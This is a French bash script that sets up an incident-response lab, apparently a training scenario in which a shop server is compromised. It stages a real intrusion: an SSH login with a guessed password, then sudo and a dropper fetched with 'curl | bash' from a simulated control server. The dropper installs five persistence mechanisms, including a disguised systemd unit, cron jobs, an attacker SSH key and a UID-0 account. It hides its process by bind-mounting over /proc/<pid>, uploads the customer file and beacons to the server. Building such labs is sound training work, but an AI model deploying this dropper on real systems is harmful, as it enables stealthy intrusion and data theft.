#!/usr/bin/env bash
# Panne : le serveur est compromis. L'intrusion est jouée pour de vrai : mot de passe de deploy deviné par SSH
# depuis Internet (203.0.113.66), sudo, puis téléchargement et exécution d'un dropper depuis le serveur de
# contrôle (198.51.100.66:443). Le dropper pose cinq persistances (unité systemd, /etc/cron.d, crontab de root
# avec @reboot, clé SSH dans /root, compte d'UID 0), lance la charge utile (une copie de bash nommée
# kdevtmpfsi, qui exécute un script), efface les deux fichiers du disque, et cache le processus en montant un
# dossier vide sur /proc/<pid> : ps, top et ss -p ne le voient plus. La charge utile envoie le fichier clients
# au serveur de contrôle, puis l'appelle toutes les 5 s.
# Pièges : tuer le processus d'abord détruit la seule copie du script (/proc/<pid>/fd/255) ; démonter /proc/<pid>
# sans couper le serveur de contrôle laisse la tâche cron réinfecter ; oublier une persistance ; supprimer la
# clé SSH légitime de root avec celle de l'attaquant ; laisser entrer le mot de passe de deploy.
# Fausses pistes : nginx, la charge CPU, le noyau.
set -euo pipefail

# Le réseau, recréé à chaque démarrage : le routeur, Internet (l'attaquant), et le serveur de contrôle.
install -d /usr/local/lib/labo /opt/labo
cat > /usr/local/lib/labo/reseau.sh <<'EOF'
#!/bin/bash
# Labo : le routeur, le poste de l'attaquant (203.0.113.66 et .77) et son serveur de contrôle (198.51.100.66).
set -e
ip netns add routeur
ip -n routeur link set lo up
ip netns exec routeur sysctl -qw net.ipv4.ip_forward=1
ip link add eth1 type veth peer name serveurs netns routeur
ip -n routeur addr add 10.29.0.1/24 dev serveurs
ip -n routeur link set serveurs up
for h in attaquant:203.0.113.66:203.0.113.1:wan-a c2:198.51.100.66:198.51.100.1:wan-c; do
  IFS=: read -r ns ip gw ifr <<<"$h"
  ip netns add "$ns"
  ip -n "$ns" link set lo up
  ip -n routeur link add "$ifr" type veth peer name eth0 netns "$ns"
  ip -n routeur addr add "$gw/24" dev "$ifr"
  ip -n routeur link set "$ifr" up
  ip -n "$ns" addr add "$ip/24" dev eth0
  ip -n "$ns" link set eth0 up
  ip -n "$ns" route add default via "$gw"
done
# Le même attaquant dispose d'autres adresses.
ip -n attaquant addr add 203.0.113.77/24 dev eth0
EOF
chmod 755 /usr/local/lib/labo/reseau.sh
cat > /etc/systemd/system/lab-reseau.service <<'EOF'
[Unit]
Description=Labo : le routeur et Internet (ne pas toucher)
DefaultDependencies=no
After=local-fs.target
Before=network-pre.target networking.service
Wants=network-pre.target

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/usr/local/lib/labo/reseau.sh

[Install]
WantedBy=multi-user.target
EOF
cat > /etc/network/interfaces.d/eth1 <<'EOF'
# Accès Internet de la boutique
auto eth1
iface eth1 inet static
    address 10.29.0.10/24
    post-up ip route add 203.0.113.0/24 via 10.29.0.1
    post-up ip route add 198.51.100.0/24 via 10.29.0.1
EOF

# La boutique, ses clients, et le compte de déploiement (mot de passe faible, sudo complet).
printf '<!doctype html>\n<title>Boutique</title>\n<p>Boutique en ligne</p>\n' > /var/www/html/index.html
install -d /var/lib/boutique
python3 - <<'EOF'
import random
random.seed(29)
with open("/var/lib/boutique/clients.csv", "w") as f:
    f.write("client;email;ville\n")
    for i in range(6000):
        f.write(f"C{100000 + i};client{100000 + i}@exemple.fr;{random.choice(['Lyon', 'Lille', 'Nantes', 'Rennes', 'Metz'])}\n")
EOF
useradd -m -s /bin/bash -G sudo deploy
echo 'deploy:Printemps2026' | chpasswd
install -d -m 700 /root/.ssh /opt/labo/cles
ssh-keygen -q -t ed25519 -N '' -C 'admin@bastion' -f /opt/labo/cles/admin
ssh-keygen -q -t ed25519 -N '' -C 'sauvegarde@srv-prod-02' -f /opt/labo/cles/attaquant
cp /opt/labo/cles/admin.pub /root/.ssh/authorized_keys
echo '30 1 * * * root /usr/local/bin/sauvegarde' > /etc/cron.d/sauvegarde
printf '#!/bin/sh\n# Sauvegarde de nuit de la boutique, vers le NAS.\nexit 0\n' > /usr/local/bin/sauvegarde
chmod 755 /usr/local/bin/sauvegarde

# Le serveur de contrôle : distribue le dropper, reçoit les appels et les envois. Tout est journalisé.
install -d /opt/labo/c2
cle=$(cat /opt/labo/cles/attaquant.pub)
cat > /opt/labo/c2/i.sh <<EOF
#!/bin/bash
[ "\$(id -u)" = 0 ] || exit 0
C2=http://198.51.100.66:443
cat > /etc/systemd/system/dbus-broker-sync.service <<'U'
[Unit]
Description=D-Bus Broker Sync
After=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'sleep 10; curl -fsm 5 http://198.51.100.66:443/i.sh | bash'

[Install]
WantedBy=multi-user.target
U
systemctl daemon-reload
systemctl enable dbus-broker-sync.service >/dev/null 2>&1
echo "*/10 * * * * root curl -fsm 5 \$C2/i.sh | bash >/dev/null 2>&1" > /etc/cron.d/sysstat-collect
(crontab -l 2>/dev/null | grep -v i.sh; echo "@reboot sleep 20; curl -fsm 5 \$C2/i.sh | bash >/dev/null 2>&1") | crontab -
grep -qF '$cle' /root/.ssh/authorized_keys || echo '$cle' >> /root/.ssh/authorized_keys
id sys-update >/dev/null 2>&1 || { useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sys-update; echo 'sys-update:Xk9!vQ2#mR' | chpasswd; }
awk '\$2 ~ "^/proc/[0-9]+\$" {f = 1} END {exit !f}' /proc/mounts && exit 0
d=/tmp/.font-unix
mkdir -p \$d/vide
cp /bin/bash \$d/kdevtmpfsi
ID=\$(head -c 4 /dev/urandom | od -An -tx1 | tr -d ' \n')
cat > \$d/.s <<S
ID=\$ID
curl -s -m 5 -X POST --data-binary @/var/lib/boutique/clients.csv "\$C2/u?id=\\\$ID" >/dev/null 2>&1
while :; do
  curl -s -m 3 "\$C2/b?id=\\\$ID&h=\\\$(hostname)" >/dev/null 2>&1
  sleep 5
done
S
cd /
setsid bash -c "exec -a '[kworker/1:2-events]' \$d/kdevtmpfsi \$d/.s" </dev/null >/dev/null 2>&1 &
sleep 1
pid=\$(pgrep -f '^\[kworker/1:2-events\]' | head -1)
rm -f \$d/kdevtmpfsi \$d/.s
[ -n "\$pid" ] && mount --bind \$d/vide /proc/\$pid
EOF
cat > /opt/labo/c2/c2.py <<'EOF'
#!/usr/bin/env python3
# Labo : le serveur de contrôle de l'attaquant (198.51.100.66:443, en HTTP). Journal : /var/log/labo-c2.log
import datetime, http.server

JOURNAL = "/var/log/labo-c2.log"


def noter(ligne):
    with open(JOURNAL, "a") as f:
        f.write(f"{datetime.datetime.now():%Y-%m-%d %H:%M:%S} {ligne}\n")


class C2(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def repondre(self, corps=b""):
        self.send_response(200)
        self.send_header("Content-Length", str(len(corps)))
        self.end_headers()
        self.wfile.write(corps)

    def do_GET(self):
        if self.path == "/i.sh":
            noter(f"{self.client_address[0]} GET /i.sh")
            return self.repondre(open("/opt/labo/c2/i.sh", "rb").read())
        noter(f"{self.client_address[0]} GET {self.path}")
        self.repondre()

    def do_POST(self):
        taille = int(self.headers.get("Content-Length", 0))
        self.rfile.read(taille)
        noter(f"{self.client_address[0]} POST {self.path} {taille} octets")
        self.repondre()


http.server.ThreadingHTTPServer(("198.51.100.66", 443), C2).serve_forever()
EOF
cat > /etc/systemd/system/lab-c2.service <<'EOF'
[Unit]
Description=Labo : Internet, tel qu'il est (ne pas toucher)
Requires=lab-reseau.service
After=lab-reseau.service

[Service]
ExecStart=/usr/sbin/ip netns exec c2 /usr/bin/python3 /opt/labo/c2/c2.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable lab-reseau lab-c2 nginx 2>/dev/null
systemctl start lab-reseau
ifup eth1
systemctl start lab-c2
systemctl restart ssh nginx
timeout 10 bash -c 'until curl -fs -o /dev/null http://198.51.100.66:443/; do sleep 0.3; done'
: > /var/log/labo-c2.log

# L'intrusion : le mot de passe de deploy, deviné depuis Internet, puis sudo et le dropper.
cat > /opt/labo/cles/mot-de-passe <<'EOF'
#!/bin/sh
echo Printemps2026
EOF
chmod 700 /opt/labo/cles/mot-de-passe
SSH_ASKPASS=/opt/labo/cles/mot-de-passe SSH_ASKPASS_REQUIRE=force DISPLAY=:0 \
  ip netns exec attaquant setsid -w ssh -n -o PubkeyAuthentication=no -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 deploy@10.29.0.10 \
  "echo Printemps2026 | sudo -S -p '' bash -c 'curl -fsm 5 http://198.51.100.66:443/i.sh | bash'" >/dev/null 2>&1

# La charge utile est cachée, et appelle son serveur de contrôle.
timeout 20 bash -c 'until grep -q "GET /b?id=" /var/log/labo-c2.log; do sleep 0.5; done'
awk '$2 ~ "^/proc/[0-9]+$" {f = 1} END {exit !f}' /proc/mounts
if pgrep -f '^\[kworker/1:2-events\]' >/dev/null; then
  echo "La charge utile aurait dû être cachée" >&2
  exit 1
fi
